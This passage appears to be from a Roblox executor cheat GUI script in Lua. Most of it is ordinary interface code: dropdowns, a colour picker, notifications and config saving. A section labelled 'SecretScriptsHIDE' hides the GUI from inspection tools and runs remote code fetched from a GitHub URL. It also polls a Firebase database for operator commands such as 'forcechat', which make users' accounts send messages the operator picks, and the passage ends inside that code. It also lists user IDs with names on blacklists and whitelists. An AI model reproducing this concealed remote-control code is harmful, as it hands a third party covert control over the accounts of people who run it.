			dropdownList.Position = UDim2.new(0, absPos.X, 0, absPos.Y + absSize.Y)
			dropdownList.Size = UDim2.new(0, absSize.X, 0, dropdownList.Size.Y.Offset)
		end
		local function buildList(filter)
			for _, child in pairs(dropdownScrolling:GetChildren()) do
				if child.Name:match("^Option_") then
					child:Destroy()
				end
			end
			local itemList = {}
			if dropdownType == "players" then
				for _, player in pairs(Players:GetPlayers()) do
					if showFriendsOnly and not player:IsFriendsWith(Players.LocalPlayer.UserId) then
						continue
					end
					local displayName = showDisplayNames and player.DisplayName or player.Name
					if filter == "" or displayName:lower():find(filter:lower(), 1, true) then
						table.insert(itemList, {
							value = player.Name,
							display = displayName,
							userId = player.UserId,
							isPlayer = true
						})
					end
				end
			elseif dropdownType == "teams" then
				for _, team in pairs(Teams:GetTeams()) do
					local teamName = team.Name
					if filter == "" or teamName:lower():find(filter:lower(), 1, true) then
						table.insert(itemList, {
							value = teamName,
							display = teamName,
							isTeam = true
						})
					end
				end
			else
				for i, item in ipairs(customList) do
					if filter == "" or item:lower():find(filter:lower(), 1, true) then
						table.insert(itemList, {
							value = item,
							display = item,
							order = i
						})
					end
				end
			end
			local visibleCount = maxVisible and math.min(#itemList, maxVisible) or #itemList
			local buttonHeight = dropdownFrame.AbsoluteSize.Y
			local totalHeight = #itemList * buttonHeight
			local visibleHeight = visibleCount * buttonHeight
			dropdownScrolling.Size = UDim2.new(1, 0, 0, visibleHeight)
			dropdownScrolling.CanvasSize = UDim2.new(0, 0, 0, totalHeight)
			for i, item in ipairs(itemList) do
				local optionButton = buttonTemplate:Clone()
				optionButton.Name = "Option_" .. i
				optionButton.Size = UDim2.new(1, 0, 0, buttonHeight)
				optionButton.LayoutOrder = item.order or i
				optionButton.Visible = true
				optionButton.ZIndex = 10
				local optionText = optionButton:FindFirstChild("text")
				local optionImage = optionButton:FindFirstChild("image")
				if optionText then
					optionText.Text = item.display
					local isSelected = multiSelect and selectedItems[item.value] or (selectedSingle == item.value)
					if isSelected then
						optionText.TextColor3 = targetColor
					end
				end
				if optionImage then
					if playerIcon and item.isPlayer then
						optionImage.Visible = true
						task.spawn(function()
							optionImage.Image = getThumb(item.userId)
						end)
					else
						optionImage.Visible = false
					end
				end
				local optionBtn = optionButton:IsA("TextButton") and optionButton or Instance.new("TextButton")
				if not optionButton:IsA("TextButton") then
					optionBtn.Size = UDim2.new(1, 0, 1, 0)
					optionBtn.BackgroundTransparency = 1
					optionBtn.Text = ""
					optionBtn.ZIndex = optionButton.ZIndex + 1
					optionBtn.Parent = optionButton
				end
				optionBtn.MouseEnter:Connect(function()
					optionButton.BorderColor3 = targetColor
					optionButton.ZIndex = 99
				end)
				optionBtn.MouseLeave:Connect(function()
					optionButton.BorderColor3 = Color3.fromRGB(50, 50, 50)
					optionButton.ZIndex = 10
				end)
				optionBtn.MouseButton1Click:Connect(function()
					if multiSelect then
						if selectedItems[item.value] then
							selectedItems[item.value] = nil
							if optionText then
								optionText.TextColor3 = Color3.fromRGB(255, 255, 255)
							end
						else
							local count = 0
							for _ in pairs(selectedItems) do count = count + 1 end
							if not maxMultiSelect or count < maxMultiSelect then
								selectedItems[item.value] = true
								if optionText then
									optionText.TextColor3 = targetColor
								end
							end
						end
						updateText()
						_G.ConfigData[configKey] = selectedItems
						saveConfig()
						if callback then
							callback(selectedItems)
						end
					else
						for _, child in pairs(dropdownScrolling:GetChildren()) do
							if child.Name:match("^Option_") then
								local childText = child:FindFirstChild("text")
								if childText then
									childText.TextColor3 = Color3.fromRGB(255, 255, 255)
								end
							end
						end
						if selectedSingle == item.value then
							selectedSingle = nil
							if optionText then
								optionText.TextColor3 = Color3.fromRGB(255, 255, 255)
							end
						else
							selectedSingle = item.value
							if optionText then
								optionText.TextColor3 = targetColor
							end
						end
						updateText()
						_G.ConfigData[configKey] = selectedSingle
						saveConfig()
						if callback then
							if dropdownType == "players" then
								local player = Players:FindFirstChild(item.value)
								callback(player)
							elseif dropdownType == "teams" then
								local team = Teams:FindFirstChild(item.value)
								callback(team)
							else
								callback(selectedSingle)
							end
						end
						isOpen = false
						dropdownList.Visible = false
						text.Visible = true
						search.Visible = false
						arrow.Visible = true
						dropdownFrame.Visible = true
						arrow.Rotation = 180
						currentOpenDropdown = nil
					end
				end)
				optionButton:SetAttribute("ItemValue", item.value)
				optionButton.Parent = dropdownScrolling
			end
			updateDropdownPosition()
		end
		local function openDropdown()
			if currentOpenDropdown and currentOpenDropdown ~= button then
				currentOpenDropdown.Click()
			end
			isOpen = true
			dropdownList.Visible = true
			arrow.Rotation = 0
			currentOpenDropdown = button
			if hasSearchbar then
				text.Visible = false
				search.Visible = true
				search.Text = ""
			end
			if dropdownSelectAll then
				dropdownSelectAll.Visible = showSelectAll
			end
			if dropdownUsers then
				dropdownUsers.Visible = showUserButtons and dropdownType == "players"
			end
			updateDropdownPosition()
			buildList("")
		end
		local function closeDropdown()
			isOpen = false
			dropdownList.Visible = false
			text.Visible = true
			search.Visible = false
			arrow.Visible = true
			dropdownFrame.Visible = true
			arrow.Rotation = 180
			if currentOpenDropdown == button then
				currentOpenDropdown = nil
			end
		end
		button.MouseButton1Click:Connect(function()
			if isOpen then
				if not hasSearchbar then
					closeDropdown()
				end
			else
				openDropdown()
			end
		end)
		arrow.MouseButton1Click:Connect(function()
			if isOpen then
				closeDropdown()
			else
				openDropdown()
			end
		end)
		if selectAllBtn then
			selectAllBtn.MouseButton1Click:Connect(function()
				if not isOpen then return end
				local currentItems = {}
				for _, child in pairs(dropdownScrolling:GetChildren()) do
					if child.Name:match("^Option_") then
						table.insert(currentItems, child)
					end
				end
				if multiSelect then
					for _, child in ipairs(currentItems) do
						local optionText = child:FindFirstChild("text")
						if optionText then
							local itemValue = child:GetAttribute("ItemValue") or optionText.Text
							selectedItems[itemValue] = true
							optionText.TextColor3 = targetColor
						end
					end
					updateText()
					_G.ConfigData[configKey] = selectedItems
					saveConfig()
					if callback then
						callback(selectedItems)
					end
				else
					if #currentItems > 0 then
						local firstChild = currentItems[1]
						local optionText = firstChild:FindFirstChild("text")
						if optionText then
							selectedSingle = firstChild:GetAttribute("ItemValue") or optionText.Text
							optionText.TextColor3 = targetColor
						end
						updateText()
						_G.ConfigData[configKey] = selectedSingle
						saveConfig()
						if callback then
							if dropdownType == "players" then
								local player = Players:FindFirstChild(selectedSingle)
								callback(player)
							elseif dropdownType == "teams" then
								local team = Teams:FindFirstChild(selectedSingle)
								callback(team)
							else
								callback(selectedSingle)
							end
						end
					end
				end
			end)
		end
		if unselectAllBtn then
			unselectAllBtn.MouseButton1Click:Connect(function()
				if not isOpen then return end
				if multiSelect then
					local itemsToRemove = {}
					for _, child in pairs(dropdownScrolling:GetChildren()) do
						if child.Name:match("^Option_") then
							local optionText = child:FindFirstChild("text")
							if optionText then
								local itemValue = child:GetAttribute("ItemValue") or optionText.Text
								table.insert(itemsToRemove, itemValue)
								optionText.TextColor3 = Color3.fromRGB(255, 255, 255)
							end
						end
					end
					for _, itemValue in ipairs(itemsToRemove) do
						selectedItems[itemValue] = nil
					end
					updateText()
					_G.ConfigData[configKey] = selectedItems
					saveConfig()
					if callback then
						callback(selectedItems)
					end
				else
					selectedSingle = nil
					for _, child in pairs(dropdownScrolling:GetChildren()) do
						if child.Name:match("^Option_") then
							local optionText = child:FindFirstChild("text")
							if optionText then
								optionText.TextColor3 = Color3.fromRGB(255, 255, 255)
							end
						end
					end
					updateText()
					_G.ConfigData[configKey] = nil
					saveConfig()
					if callback then
						callback(nil)
					end
				end
			end)
		end
		if displayBtn then
			displayBtn.MouseButton1Click:Connect(function()
				showDisplayNames = not showDisplayNames
				displayBtn.Text = showDisplayNames and "Show Username" or "Show Display"
				if isOpen then
					buildList(hasSearchbar and search.Text or "")
				end
			end)
		end
		if friendsBtn then
			friendsBtn.MouseButton1Click:Connect(function()
				showFriendsOnly = not showFriendsOnly
				friendsBtn.Text = showFriendsOnly and "Show All" or "Friends Only"
				if isOpen then
					buildList(hasSearchbar and search.Text or "")
				end
			end)
		end
		if hasSearchbar then
			search:GetPropertyChangedSignal("Text"):Connect(function()
				if isOpen then
					buildList(search.Text)
				end
			end)
		end
		dropdownFrame:GetPropertyChangedSignal("AbsolutePosition"):Connect(function()
			if isOpen then
				updateDropdownPosition()
			end
		end)
		if outlineStroke and outlineStroke:IsA("UIStroke") then
			local originalColor = outlineStroke.Color
			local originalThickness = outlineStroke.Thickness
			local originalTransparency = outlineStroke.Transparency
			outlineStroke.ZIndex = 1
			button.MouseEnter:Connect(function()
				outlineStroke.Color = targetColor
				outlineStroke.Thickness = 1
				outlineStroke.Transparency = 0
				outlineStroke.ZIndex = 99
				if tooltipText and _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
			button.MouseLeave:Connect(function()
				outlineStroke.Color = originalColor
				outlineStroke.Thickness = originalThickness
				outlineStroke.Transparency = originalTransparency
				outlineStroke.ZIndex = 1
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
		if dropdownType == "players" then
			Players.PlayerAdded:Connect(function()
				if isOpen then
					buildList(hasSearchbar and search.Text or "")
				end
			end)
			Players.PlayerRemoving:Connect(function(player)
				if multiSelect and selectedItems[player.Name] then
					selectedItems[player.Name] = nil
					updateText()
					_G.ConfigData[configKey] = selectedItems
					saveConfig()
				elseif selectedSingle == player.Name then
					selectedSingle = nil
					updateText()
					_G.ConfigData[configKey] = nil
					saveConfig()
				end
				if isOpen then
					buildList(hasSearchbar and search.Text or "")
				end
			end)
		end
		text.Visible = true
		search.Visible = false
		arrow.Visible = true
		dropdownFrame.Visible = true
		arrow.Rotation = 180
		dropdownList.Visible = false
		buttonTemplate.Visible = false
		if dropdownSelectAll then
			dropdownSelectAll.Visible = false
		end
		if dropdownUsers then
			dropdownUsers.Visible = false
		end
		updateText()
	end
	_G.CreateDropdown = CreateDropdown
end;
task.spawn(C_2c2);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ColorPickerMaster
local function C_2c3()
local script = G2L["2c3"];
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local screenGui = getScreenGui()
	if not screenGui then return end
	
	local UserInputService = game:GetService("UserInputService")
	local HttpService = game:GetService("HttpService")
	
	local colorFrame = screenGui:FindFirstChild("Color")
	if not colorFrame then return end
	
	local targetColor = colorFrame.BackgroundColor3
	
	_G.ConfigData = _G.ConfigData or {}
	
	local CONFIG_FILE = "myconfig.json"
	
	local function saveConfig()
		pcall(function()
			writefile(CONFIG_FILE, HttpService:JSONEncode(_G.ConfigData))
		end)
	end
	
	local function loadConfig()
		local success, data = pcall(function()
			return readfile(CONFIG_FILE)
		end)
		if success and data then
			_G.ConfigData = HttpService:JSONDecode(data)
		end
	end
	
	loadConfig()
	
	local mainColorPicker = screenGui:FindFirstChild("ColorPicker")
	if not mainColorPicker then return end
	
	local activePickerButton = nil
	local activeConfigKey = nil
	local activeCallback = nil
	local activeButtonColorFrame = nil
	local activeButtonStroke = nil
	
	local function CreateColorPicker(config)
		local frameName = config.frame
		local colorPickerFrameName = config.colorpickerframe
		local tooltipText = config.tooltip
		local defaultColor = config.default
		local titleText = config.title
		local alphaEnabled = config.alpha ~= false
		local defaultAlpha = config.defaultalpha or 0
		local callback = config.callback
	
		local groupboxFrame = config.groupbox.Parent
		local frame = groupboxFrame:FindFirstChild(frameName)
		if not frame then return end
	
		local pickerButton = frame:FindFirstChild(colorPickerFrameName)
		if not pickerButton then return end
	
		local buttonColorFrame = pickerButton:FindFirstChild("colorFrame")
		if not buttonColorFrame then return end
	
		local buttonStroke = buttonColorFrame:FindFirstChild("UIStroke")
	
		-- Determine default color
		local startColor = Color3.fromRGB(255, 255, 255)
		if defaultColor == "frameColor" then
			startColor = targetColor
		elseif type(defaultColor) == "string" then
			local r, g, b = defaultColor:match("(%d+),%s*(%d+),%s*(%d+)")
			if r and g and b then
				startColor = Color3.fromRGB(tonumber(r), tonumber(g), tonumber(b))
			end
		elseif typeof(defaultColor) == "Color3" then
			startColor = defaultColor
		end
	
		-- Config key
		local configKey = frameName .. "_" .. colorPickerFrameName
	
		-- Load saved color from config
		if _G.ConfigData[configKey] then
			local saved = _G.ConfigData[configKey]
			startColor = Color3.fromRGB(saved.r, saved.g, saved.b)
			defaultAlpha = saved.a or defaultAlpha
		end
	
		-- Set initial button color
		buttonColorFrame.BackgroundColor3 = startColor
		if buttonStroke then
			buttonStroke.Color = startColor
		end
	
		-- Set title
		if titleText then
			local titleLabel = mainColorPicker.innerframelayout:FindFirstChild("text")
			if titleLabel then
				titleLabel.Text = titleText
			end
		end
	
		-- Hide/show transparency
		local transparencyFrame = mainColorPicker.innerframelayout:FindFirstChild("transparency")
		if transparencyFrame then
			transparencyFrame.Visible = alphaEnabled
		end
	
		-- Position picker under button or center
		local function positionPicker()
			if _G.CenterColorPicker then
				-- Center on screen
				local screenSize = screenGui.AbsoluteSize
				local pickerSize = mainColorPicker.AbsoluteSize
				mainColorPicker.Position = UDim2.new(0, (screenSize.X - pickerSize.X) / 2, 0, (screenSize.Y - pickerSize.Y) / 2)
			else
				-- Position under button
				local isRightside = groupboxFrame.Name:lower():find("right")
				local buttonPos = pickerButton.AbsolutePosition
				local buttonSize = pickerButton.AbsoluteSize
				local pickerSize = mainColorPicker.AbsoluteSize
	
				if isRightside then
					mainColorPicker.Position = UDim2.new(0, buttonPos.X + buttonSize.X - pickerSize.X, 0, buttonPos.Y + buttonSize.Y)
				else
					mainColorPicker.Position = UDim2.new(0, buttonPos.X, 0, buttonPos.Y + buttonSize.Y)
				end
			end
		end
	
		-- Click button to open/close picker
		local RunService = game:GetService("RunService")
		local updateConnection = nil
	
		pickerButton.MouseButton1Click:Connect(function()
			if mainColorPicker.Visible and activePickerButton == pickerButton then
				-- Close (act as cancel)
				mainColorPicker.Visible = false
				activePickerButton = nil
				if updateConnection then
					updateConnection:Disconnect()
					updateConnection = nil
				end
			else
				-- Open
				positionPicker()
				mainColorPicker.Visible = true
				activePickerButton = pickerButton
	
				-- Store active picker data
				activeConfigKey = configKey
				activeCallback = callback
				activeButtonColorFrame = buttonColorFrame
				activeButtonStroke = buttonStroke
	
				-- Update title
				if titleText then
					local titleLabel = mainColorPicker.innerframelayout:FindFirstChild("text")
					if titleLabel then
						titleLabel.Text = titleText
					end
				end
	
				-- Update transparency visibility
				local transparencyFrame = mainColorPicker.innerframelayout:FindFirstChild("transparency")
				if transparencyFrame then
					transparencyFrame.Visible = alphaEnabled
					if alphaEnabled then
						mainColorPicker.Size = UDim2.new(0, 200, 0, 270)
					else
						mainColorPicker.Size = UDim2.new(0, 200, 0, 252)
					end
				end
	
				-- Continuously update position while open
				if updateConnection then
					updateConnection:Disconnect()
				end
				updateConnection = RunService.RenderStepped:Connect(function()
					if mainColorPicker.Visible and activePickerButton == pickerButton then
						positionPicker()
					else
						if updateConnection then
							updateConnection:Disconnect()
							updateConnection = nil
						end
					end
				end)
	
				-- Set picker to current button color
				if _G.SetColorPickerColor then
					_G.SetColorPickerColor(buttonColorFrame.BackgroundColor3, defaultAlpha)
				end
			end
		end)
	
		-- Tooltip
		if tooltipText then
			pickerButton.MouseEnter:Connect(function()
				if _G.ShowTooltip then
					local mousePos = UserInputService:GetMouseLocation()
					local guiInset = game:GetService("GuiService"):GetGuiInset()
					local uiScale = screenGui:FindFirstChildOfClass("UIScale")
					local scale = uiScale and uiScale.Scale or 1
					local tooltip = screenGui:FindFirstChild("Tooltip")
					if tooltip then
						tooltip.Position = UDim2.new(0, (mousePos.X - guiInset.X + 12) / scale, 0, (mousePos.Y - guiInset.Y + 12) / scale)
					end
					_G.ShowTooltip(tooltipText)
				end
			end)
			pickerButton.MouseLeave:Connect(function()
				if _G.HideTooltip then
					_G.HideTooltip()
				end
			end)
		end
	end
	
	_G.CreateColorPicker = CreateColorPicker
	
	-- Apply button (connected ONCE for all colorpickers)
	local applyButton = mainColorPicker.innerframelayout.applycancel.apply
	applyButton.MouseButton1Click:Connect(function()
		if not activePickerButton then return end
	
		if _G.GetColorPickerColor then
			local selectedColor, selectedAlpha = _G.GetColorPickerColor()
	
			if activeButtonColorFrame then
				activeButtonColorFrame.BackgroundColor3 = selectedColor
				activeButtonColorFrame.BackgroundTransparency = 0
			end
			if activeButtonStroke then
				activeButtonStroke.Color = selectedColor
			end
	
			if activeConfigKey then
				_G.ConfigData[activeConfigKey] = {
					r = math.floor(selectedColor.R * 255),
					g = math.floor(selectedColor.G * 255),
					b = math.floor(selectedColor.B * 255),
					a = selectedAlpha
				}
				saveConfig()
			end
	
			if activeCallback then
				activeCallback(selectedColor, selectedAlpha)
			end
	
			mainColorPicker.Visible = false
			activePickerButton = nil
		end
	end)
	
	-- Cancel button (connected ONCE for all colorpickers)
	local cancelButton = mainColorPicker.innerframelayout.applycancel.cancel
	cancelButton.MouseButton1Click:Connect(function()
		if not activePickerButton then return end
	
		mainColorPicker.Visible = false
		activePickerButton = nil
	end)
end;
task.spawn(C_2c3);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.ChatMaster
local function C_2c4()
local script = G2L["2c4"];
	-- ChatMaster Script (put in Gui.MasterScripts.ChatMaster)
	local Players = game:GetService("Players")
	local TextChatService = game:GetService("TextChatService")
	
	_G.ChatHandlers = _G.ChatHandlers or {}
	
	TextChatService.OnIncomingMessage = function(mdata)
		local plr = mdata.TextSource
			and mdata.TextSource.UserId
			and Players:GetPlayerByUserId(mdata.TextSource.UserId)
	
		if not plr then return end
	
		-- Call all registered handlers
		for _, handler in ipairs(_G.ChatHandlers) do
			pcall(function()
				handler(mdata, plr)
			end)
		end
	end
end;
task.spawn(C_2c4);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.UserList
local function C_2c5()
local script = G2L["2c5"];
	-- UserListMaster Script (put in Gui.MasterScripts)
	_G.UserLists = {
		Blacklisted = {
			1535622508, -- Buildermann
			3590692150, -- DeLight
			1704747, -- snips
			3234700453, -- Box_boy56433
			10385488328, -- Ihateroblox_oq
			5695584804, -- strongestegg83973
			10923596100, -- serverbot_tco
			4393801944, -- gelato
		},
		Whitelisted = {
			2494382421, -- raja 22
			10642124279, -- raja 21
			8008797519, -- phan main
			10840760745, -- phan einstein
			2735168711, -- slime 2
			3492744393, -- slime
			909205143, -- pop
			7999975433, -- koi
			10946974452, -- korea
		},
		Owners = {
			2494382421,   -- main
			10587072700, -- ryansocoool
			8308247571,  -- bobby2 agarv_bbc
			10837544781, -- agarv609
			10842814389, -- MONKEYARMPIT6
		},
		HWIDBanned = {
			-- Add HWIDs here
		}
	}
	-- Helper functions
	function _G.IsBlacklisted(userId)
		for _, id in ipairs(_G.UserLists.Blacklisted) do
			if userId == id then
				return true
			end
		end
		return false
	end
	function _G.IsWhitelisted(userId)
		for _, id in ipairs(_G.UserLists.Whitelisted) do
			if userId == id then
				return true
			end
		end
		return false
	end
	function _G.IsOwner(userId)
		for _, id in ipairs(_G.UserLists.Owners) do
			if userId == id then
				return true
			end
		end
		return false
	end
	function _G.IsHWIDBanned(hwid)
		for _, id in ipairs(_G.UserLists.HWIDBanned) do
			if hwid == id then
				return true
			end
		end
		return false
	end
end;
task.spawn(C_2c5);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.MAINCALLS
local function C_2c6()
local script = G2L["2c6"];
	local Players = game:GetService("Players")
	local LocalPlayer = Players.LocalPlayer
	
	shared.ResetCharacter = function()
		if LocalPlayer.Character then
			LocalPlayer.Character:BreakJoints()
		end
	end
end;
task.spawn(C_2c6);
-- StarterGui.T5784YHRGE89ES98T.MasterScripts.Notif
local function C_2c7()
local script = G2L["2c7"];
	-- Notification System (FIXED REPOSITIONING + UNLIMITED STACKING + CUSTOM SFX)
	local function getScreenGuiForNotif()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local notifScreenGui = getScreenGuiForNotif()
	if not notifScreenGui then 
		warn("ScreenGui not found for notifications!")
		return 
	end
	
	-- Get the accent color from your Color frame
	local colorFrame = notifScreenGui:FindFirstChild("Color")
	local notifTargetColor = colorFrame and colorFrame.BackgroundColor3 or Color3.fromRGB(0, 124, 255)
	
	local NotificationSystem = {}
	local TweenService = game:GetService("TweenService")
	local TextService = game:GetService("TextService")
	
	local activeNotifications = {}
	
	local function repositionNotifications()
		local yOffset = 0.02
		for i, notifData in ipairs(activeNotifications) do
			if notifData.frame and notifData.frame.Parent then
				TweenService:Create(notifData.frame, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), {
					Position = UDim2.new(0, 10, yOffset, 0)
				}):Play()
				yOffset = yOffset + 0.03
			end
		end
	end
	
	function NotificationSystem:Notify(text, duration, soundId)
		if not notifScreenGui then 
			warn("ScreenGui not found!")
			return 
		end
	
		duration = duration or 5
		soundId = soundId or nil
	
		-- Update color in case it changed
		if colorFrame then
			notifTargetColor = colorFrame.BackgroundColor3
		end
	
		-- Play sound if provided
		if soundId then
			-- Preload the sound first
			local preloadSound = Instance.new("Sound")
			preloadSound.SoundId = "rbxassetid://" .. tostring(soundId)
			preloadSound.Volume = 0
			preloadSound.Parent = game:GetService("SoundService")
	
			local loaded = false
			preloadSound.Loaded:Connect(function()
				loaded = true
			end)
	
			-- Wait for it to load (max 0.5 seconds)
			local startTime = tick()
			while not loaded and (tick() - startTime) < 0.5 do
				task.wait()
			end
	
			preloadSound:Destroy()
	
			-- Now play the actual sound
			local sound = Instance.new("Sound")
			sound.SoundId = "rbxassetid://" .. tostring(soundId)
			sound.Volume = 0.5
			sound.Parent = game:GetService("SoundService")
			sound:Play()
	
			sound.Ended:Connect(function()
				sound:Destroy()
			end)
		end
	
		-- Calculate text size
		local textBounds = TextService:GetTextSize(
			text,
			12,
			Enum.Font.Code,
			Vector2.new(300, math.huge)
		)
	
		local width = math.max(100, math.min(textBounds.X + 14, 350))
		local height = 20
	
		-- Create notification frame
		local notif = Instance.new("Frame")
		notif.Name = "Notif"
		notif.ZIndex = 1000000009
		notif.BackgroundColor3 = Color3.fromRGB(21, 21, 21)
		notif.BorderMode = Enum.BorderMode.Inset
		notif.Size = UDim2.new(0, width, 0, height)
		notif.BorderColor3 = Color3.fromRGB(51, 51, 51)
		notif.Parent = notifScreenGui
	
		-- Initial position (will be repositioned)
		notif.Position = UDim2.new(0, 10, 0.02, 0)
	
		-- Fade canvas group
		local notifFade = Instance.new("CanvasGroup")
		notifFade.Name = "notifFade"
		notifFade.BorderSizePixel = 0
		notifFade.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
		notifFade.Size = UDim2.new(1, 0, 1, 0)
		notifFade.Parent = notif
	
		local gradient = Instance.new("UIGradient")
		gradient.Rotation = 90
		gradient.Transparency = NumberSequence.new{
			NumberSequenceKeypoint.new(0.000, 1),
			NumberSequenceKeypoint.new(1.000, 0.7)
		}
		gradient.Parent = notifFade
	
		-- Text label
		local textLabel = Instance.new("TextLabel")
		textLabel.Name = "text"
		textLabel.TextWrapped = true
		textLabel.ZIndex = 999999999
		textLabel.BorderSizePixel = 0
		textLabel.TextSize = 12
		textLabel.TextXAlignment = Enum.TextXAlignment.Left
		textLabel.BackgroundTransparency = 1
		textLabel.Font = Enum.Font.Code
		textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
		textLabel.Size = UDim2.new(1, 0, 1, 0)
		textLabel.Text = text
		textLabel.Parent = notif
	
		local textStroke = Instance.new("UIStroke")
		textStroke.Parent = textLabel
	
		local padding = Instance.new("UIPadding")
		padding.PaddingLeft = UDim.new(0, 7)
		padding.Parent = textLabel
	
		local uiScale = Instance.new("UIScale")
		uiScale.Scale = 0
		uiScale.Parent = notif
	
		local outlineStroke = Instance.new("UIStroke")
		outlineStroke.Parent = notif
	
		-- Accent color bar
		local guiColor = Instance.new("Frame")
		guiColor.Name = "GuiColor"
		guiColor.ZIndex = 999999999
		guiColor.BorderSizePixel = 0
		guiColor.BackgroundColor3 = notifTargetColor
		guiColor.Size = UDim2.new(0, 2, 1, 0)
		guiColor.Parent = notif
	
		print("Notification created:", text)
	
		-- Add to active list
		local notifData = {frame = notif}
		table.insert(activeNotifications, notifData)
	
		-- Reposition all notifications
		repositionNotifications()
	
		-- Animate in
		TweenService:Create(uiScale, TweenInfo.new(0.6, Enum.EasingStyle.Back, Enum.EasingDirection.Out), {
			Scale = 1
		}):Play()
	
		-- Auto-destroy after duration
		task.delay(duration, function()
			TweenService:Create(uiScale, TweenInfo.new(0.2, Enum.EasingStyle.Back, Enum.EasingDirection.In), {
				Scale = 0
			}):Play()
	
			task.wait(0.2)
	
			-- Remove from active list
			for i, n in pairs(activeNotifications) do
				if n == notifData then
					table.remove(activeNotifications, i)
					break
				end
			end
	
			notif:Destroy()
	
			-- Reposition remaining notifications
			repositionNotifications()
		end)
	end
	
	_G.Notify = function(text, duration, soundId)
		NotificationSystem:Notify(text, duration, soundId)
	end
end;
task.spawn(C_2c7);
-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AntiDex
local function C_2c9()
local script = G2L["2c9"];
	-- GUI Protection Script
	-- Place this at the top of your main script
	-- Cancel if running in Studio
	if game:GetService("RunService"):IsStudio() then
		return
	end
	
	local Players = game:GetService("Players")
	local CoreGui = game:GetService("CoreGui")
	local LocalPlayer = Players.LocalPlayer
	local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
	
	-- Find the ScreenGui
	local function getScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
	end
	
	local RealGui = getScreenGui()
	if not RealGui then return end
	
	-- ============================================================
	-- STEP 1: Move real GUI to CoreGui
	-- ============================================================
	RealGui.Parent = CoreGui
	
	-- ============================================================
	-- STEP 2: Rename folders ending with HIDE to "Folder" and all scripts to "LocalScript"
	-- ============================================================
	for _, descendant in pairs(RealGui:GetDescendants()) do
		if descendant:IsA("LocalScript") or descendant:IsA("ModuleScript") or descendant:IsA("Script") then
			descendant.Name = "LocalScript"
		elseif descendant:IsA("Folder") and descendant.Name:match("HIDE$") then
			descendant.Name = "Folder"
		end
	end
	
	-- ============================================================
	-- STEP 2.5: Create 10 fake MainFrames in the real ScreenGui
	-- ============================================================
	local instanceTypes = {"Frame", "TextLabel", "TextButton", "ImageLabel", "ScrollingFrame", "Folder", "LocalScript"}
	
	local function randomString(length)
		local chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
		local result = ""
		for i = 1, length do
			local rand = math.random(1, #chars)
			result = result .. chars:sub(rand, rand)
		end
		return result
	end
	
	for i = 1, 10 do
		local fakeFrame = Instance.new("Frame")
		fakeFrame.Name = "MainFrame"
		fakeFrame.Visible = false
		fakeFrame.Parent = RealGui
	
		local numChildren = math.random(3, 8)
		for j = 1, numChildren do
			local randomType = instanceTypes[math.random(1, #instanceTypes)]
			local fakeChild = Instance.new(randomType)
			fakeChild.Name = randomString(math.random(5, 12))
	
			if fakeChild:IsA("GuiObject") then
				fakeChild.Visible = false
			end
	
			if fakeChild:IsA("LocalScript") then
				fakeChild.Disabled = true
			end
	
			fakeChild.Parent = fakeFrame
		end
	end
end;
task.spawn(C_2c9);
-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.BlacklistCheck
local function C_2ca()
local script = G2L["2ca"];
	-- Blacklist Check Script
	-- Place this LocalScript at the start of your GUI execution
	local Players = game:GetService("Players")
	local player = Players.LocalPlayer
	
	-- Find the ScreenGui
	local function findScreenGui()
		local p = script.Parent
		while p do
			if p:IsA("ScreenGui") then return p end
			p = p.Parent
		end
		return nil
	end
	
	-- Wait for the helper functions to be loaded
	repeat task.wait() until _G.IsBlacklisted and _G.IsHWIDBanned
	
	-- Get HWID (executor-dependent, this is a common method)
	local hwid = game:GetService("RbxAnalyticsService"):GetClientId() -- or use your executor's gethwid() function
	
	-- Check if player is blacklisted OR HWID banned
	if _G.IsBlacklisted(player.UserId) or _G.IsHWIDBanned(hwid) then
		-- Execute both at the same time
		spawn(function()
			loadstring(game:HttpGet("https://raw.githubusercontent.com/agarvsocooolsmith/Scripts/refs/heads/main/blacklistmessage"))()
		end)
	
		local screenGui = findScreenGui()
		if screenGui then
			screenGui:Destroy()
		end
		return
	end
	
	-- If not blacklisted, continue with normal script execution below
end;
task.spawn(C_2ca);
-- StarterGui.T5784YHRGE89ES98T.SecretScriptsHIDE.AdminControl
local function C_2cb()
local script = G2L["2cb"];
	local FIREBASE_URL = "https://agar-ware-default-rtdb.firebaseio.com"
	local HttpService = game:GetService("HttpService")
	local Players = game:GetService("Players")
	local TextChatService = game:GetService("TextChatService")
	local LocalPlayer = Players.LocalPlayer
	local _req = (syn and syn.request) or request or http_request or (fluxus and fluxus.request)
	local lastCommandTimestamp = os.time()
	
	local function checkForCommands()
		pcall(function()
			local response = _req({
				Url = FIREBASE_URL .. "/commands/" .. LocalPlayer.Name .. ".json",
				Method = "GET"
			})
			if response.StatusCode == 200 and response.Body ~= "null" then
				local commandData = HttpService:JSONDecode(response.Body)
				if commandData and commandData.timestamp > lastCommandTimestamp then
					lastCommandTimestamp = commandData.timestamp
					if commandData.type == "forcechat" then
						pcall(function()
							if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
								TextChatService.TextChannels.RBXGeneral:SendAsync(commandData.message)
							else
